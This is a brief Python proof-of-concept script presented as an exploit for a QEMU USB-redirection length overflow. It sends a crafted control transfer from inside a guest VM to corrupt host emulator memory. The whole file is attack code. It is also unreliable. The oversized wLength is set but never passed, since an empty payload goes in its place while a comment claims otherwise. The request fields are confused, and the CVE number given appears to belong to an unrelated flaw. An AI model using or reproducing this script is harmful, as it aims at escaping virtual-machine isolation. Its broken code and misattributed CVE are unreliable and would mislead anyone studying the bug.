#!/usr/bin/env python3
"""
PoC for QEMU USB redirection length overflow (CVE-2012-0217)

Uses PyUSB inside the guest to send a control transfer with an
oversized wLength, triggering an OOB read/write in QEMU’s USB-redir.
"""

import usb.core
import usb.util
import sys

# find any USB device (we abuse the redirection layer, not the device itself)
dev = usb.core.find(find_all=True)
dev = next(dev, None)
if dev is None:
    print("[-] No USB device found to trigger redirection")
    sys.exit(1)

# bmRequestType: host→device, type=class, recipient=device
bmRequestType = usb.util.build_request_type(
    usb.util.CTRL_OUT, usb.util.CTRL_TYPE_CLASS, usb.util.CTRL_RECIPIENT_DEVICE)
bRequest   = 0x09   # SET_CONFIGURATION (example command class)
wValue     = 0      # configuration value
wIndex     = 0      # interface
# Craft an empty payload but request huge length
payload    = b''
wLength    = 0x10000  # oversized length to overflow
timeout    = 1000

print(f"[+] Sending ctrl_transfer with wLength=0x{wLength:04x}")
# this encodes wLength into the USB packet header
dev.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, payload, timeout)
print("[+] ctrl_transfer sent, check QEMU for corruption") 